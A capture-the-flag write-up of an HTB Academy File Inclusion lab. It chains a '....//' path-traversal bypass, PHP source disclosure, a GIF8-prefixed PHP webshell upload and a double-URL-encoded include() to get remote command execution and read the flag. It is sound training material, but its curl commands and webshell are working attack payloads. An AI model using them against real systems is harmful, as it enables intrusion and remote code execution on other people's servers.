# HTB Academy — File Inclusion Skills Assessment Writeup

**Module:** File Inclusion  
**Target:** `154.57.164.67:31526`  
**Flag:** `eedbb78d4800aa45573840ed6bd2d1e3`

---

## Scenario

Sumace Consulting GmbH website. CISO flagged a recently added job application form as a point of interest. Goal: RCE and read the flag in `/`.

---

## Attack Chain

### 1. Recon — Identify Attack Surface

```bash
curl -s "http://154.57.164.67:31526/" | grep -i "href\|src\|action"
```

Found three pages:
- `/contact.php` — contact info
- `/apply.php` — job application form with file upload → POST to `/api/application.php`
- `/api/image.php?p=<md5hash>` — serves images via a `p` parameter

### 2. LFI Discovery — image.php

Tested `p` parameter for LFI. Direct path traversal and URL-encoding both failed. `....//` bypass (non-recursive filter bypass) succeeded:

```bash
curl -s "http://154.57.164.67:31526/api/image.php?p=....//....//....//....//etc/passwd"
# Returns /etc/passwd ✓
```

**Filter:** `str_replace("../", "", $_GET["p"])` — non-recursive, so `....//` → after removal → `../`.

### 3. Source Code Disclosure — Read PHP Sources via LFI

`image.php` uses `file_get_contents()` (read-only, does not execute PHP), so using it for RCE isn't possible directly. Used it to read all PHP sources:

**`image.php` source:**
```php
$path = "../images/" . str_replace("../", "", $_GET["p"]);
$contents = file_get_contents($path);
header("Content-Type: image/jpeg");
echo $contents;
```

**`application.php` source (upload handler):**
```php
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);
```
Key: files stored as `md5_file(content).[original_ext]` in `/uploads/`.

**`contact.php` source — the real LFI with `include()`:**
```php
if (isset($_GET["region"])) {
    if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {
        echo "'region' parameter contains invalid character(s)";
        $danger = true;
    } else {
        $region = urldecode($_GET["region"]);
    }
}
if (!$danger) {
    include "./regions/" . $region . ".php";
}
```

**Nginx config** confirmed:
- `/uploads/` → `deny all` (no direct web access)
- `/regions/` → `deny all`
- PHP 8.2 via FPM

### 4. Filter Bypass Analysis — contact.php

The filter checks `$_GET["region"]` for `.` and `/`, then calls `urldecode()` after. **Double URL encoding bypasses it:**

- PHP auto-decodes query params once: `%252E` → `$_GET["region"]` = `%2E`
- Filter sees `%2E` — no literal `.` → passes
- `urldecode("%2E")` = `.` → `$region` = `.`

### 5. Upload PHP Webshell

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s -F "firstName=John" -F "lastName=Doe" -F "email=test@test.com" \
  -F "file=@/tmp/shell.php" -F "notes=test" \
  "http://154.57.164.67:31526/api/application.php"
# 302 redirect → upload succeeded
```

Compute MD5 of file content (matches what `md5_file()` produces on server):
```bash
md5sum /tmp/shell.php
# 3f8685106a8b7bdcfdd77d8067845cdc
```

File stored on server as: `/var/www/html/uploads/3f8685106a8b7bdcfdd77d8067845cdc.php`

### 6. RCE via contact.php + Double URL Encoding

Include the uploaded shell through `contact.php?region=`:
- Want: `./regions/../uploads/3f8685106a8b7bdcfdd77d8067845cdc.php`
- `$region` after urldecode must be: `../uploads/3f8685106a8b7bdcfdd77d8067845cdc`
- Double-encoded: `%252E%252E%252Fuploads%252F3f8685106a8b7bdcfdd77d8067845cdc`

```bash
curl -s "http://154.57.164.67:31526/contact.php?region=%252E%252E%252Fuploads%252F3f8685106a8b7bdcfdd77d8067845cdc&cmd=id"
# GIF8uid=33(www-data) gid=33(www-data) groups=33(www-data) ✓
```

### 7. Read the Flag

```bash
# List / to find flag filename (never assume flag.txt)
curl -s "http://154.57.164.67:31526/contact.php?region=%252E%252E%252Fuploads%252F3f8685106a8b7bdcfdd77d8067845cdc&cmd=ls+/"
# flag_09ebca.txt

curl -s "http://154.57.164.67:31526/contact.php?region=%252E%252E%252Fuploads%252F3f8685106a8b7bdcfdd77d8067845cdc&cmd=cat+/flag_09ebca.txt" \
  | grep -oP 'GIF8\K[^\s<]+'
# eedbb78d4800aa45573840ed6bd2d1e3
```

---

## Key Lessons

1. **Two separate LFI points can have different capabilities** — `image.php` had LFI via `file_get_contents()` (read-only), `contact.php` had LFI via `include()` (execute). Source disclosure from the first enabled finding the second.

2. **Read PHP source early** — using the read-only LFI to extract all PHP sources revealed the upload path formula, the real include() LFI, and confirmed nginx blocks direct upload execution. This completely defined the attack chain before touching `contact.php`.

3. **Double URL encoding beats urldecode-after-check** — when a filter checks `$_GET["param"]` (already PHP-decoded) then calls `urldecode()` on it, double encoding passes the check (`%2E`) and gets decoded to the real character (`.`) afterward.

4. **`md5_file()` not `md5()` of filename** — the server hashed file CONTENT, not the name. Compute the hash locally from the same file you uploaded: `md5sum /tmp/shell.php`.

5. **`include()` appends `.php`** — `include "./regions/" . $region . ".php"` means the traversal only needs the hash without extension.

6. **`ls /` before `cat`** — flag was `flag_09ebca.txt`, not `flag.txt`.

7. **Nginx `deny all` on uploads doesn't stop LFI** — nginx only controls HTTP access. PHP `include()` reads directly from the filesystem, bypassing nginx restrictions entirely.

---

## Techniques Used

| Technique | Where Applied |
|-----------|---------------|
| Non-recursive `../` bypass (`....//`) | `image.php?p=` to read files |
| `file_get_contents()` LFI for source disclosure | Read all PHP source files |
| Upload + LFI | Uploaded PHP webshell, included via `include()` |
| Double URL encoding | Bypass `.` and `/` filter in `contact.php?region=` |
| GIF8 magic bytes | Bypass content-type validation on upload |
